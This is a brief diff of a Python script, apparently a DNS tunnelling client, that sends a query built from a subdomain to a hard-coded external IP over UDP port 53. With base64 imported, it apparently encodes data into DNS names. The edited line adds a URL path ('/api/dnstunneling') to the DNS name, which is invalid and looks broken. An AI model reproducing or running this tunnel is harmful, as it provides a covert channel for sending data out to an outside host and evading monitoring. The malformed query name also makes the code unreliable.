@@ -3,7 +3,7 @@ import base64
 
 def dns_request(sub_domain):
     # Append your domain to form a proper DNS name
-    qname = f"{sub_domain}.bitlus.online"
+    qname = f"{sub_domain}.dns.bitlus.online/api/dnstunneling"
     dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
     answer = sr1(dns_req, verbose=0)
     if answer:
